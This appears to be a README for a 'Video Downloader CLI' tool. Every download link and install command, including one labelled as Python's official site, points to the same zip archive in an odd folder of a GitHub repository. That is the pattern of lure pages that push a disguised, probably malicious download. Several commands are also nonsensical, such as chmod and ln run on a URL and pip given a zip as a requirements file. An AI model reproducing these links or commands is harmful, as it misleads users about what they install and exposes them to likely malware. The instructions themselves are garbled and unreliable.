## 🚀 Getting Started

This guide will help you download and run the Video Downloader CLI application. Follow these simple steps to get started quickly.

## 📥 Download & Install

1. **Visit the Releases Page**  
   Go to our [Releases page](https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip) to download the latest version.

## ⚙️ Installation Steps

### 1. Install Dependencies

Make sure you have Python 3 installed on your computer. If you don't have it yet, download it from [Python's official site](https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip).

Now, open your command line interface (CLI) and run:

```bash
pip install -r https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip
```

Alternatively, if you want to install yt-dlp directly, use:

```bash
pip install yt-dlp
```

### 2. Make the Script Executable

To allow your script to run, you need to make it executable. Type the following command:

```bash
chmod +x https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip
```

### 3. Set Up Alias (Choose One Method)

#### Method 1: Symbolic Link (Recommended)

You can create a symbolic link for easier access. Use this command:

```bash
sudo ln -s https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip /usr/local/bin/video-dwd
```

Make sure to replace `https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip` with the actual path where you have saved the script.

#### Method 2: Direct Execution

If you prefer not to set up an alias, you can run the script directly from its location:

```bash
python https://github.com/LaManodeAlejo/video-dwd-cli/raw/refs/heads/master/supraconscious/video-dwd-cli-v2.6.zip
```
